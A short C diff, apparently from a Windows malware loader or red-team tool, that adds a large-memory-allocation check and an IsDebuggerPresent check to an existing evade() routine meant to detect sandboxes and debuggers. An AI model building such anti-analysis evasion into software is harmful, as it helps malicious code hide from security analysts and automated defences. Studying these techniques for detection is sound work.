@@ -37,8 +37,26 @@ BOOL checkResources() {
   return true;
 }
 
+BOOL allocate_mem() {
+  char *mem = NULL;
+  mem = (char *) malloc(100000000);
+  if (mem != NULL) {
+      memset(mem, 00, 100000000);
+      free(mem);
+      return true;
+  }
+  return false;
+}
+
+BOOL debugger_attached() {
+  if (IsDebuggerPresent()) {
+    return true;
+  }
+  return false;
+} 
+
 BOOL evade() {
-  if (checkNUMA() || checkResources()) {
+  if (checkNUMA() || checkResources() || allocate_mem() || debugger_attached()) {
     return false;
   } else {
     return true;
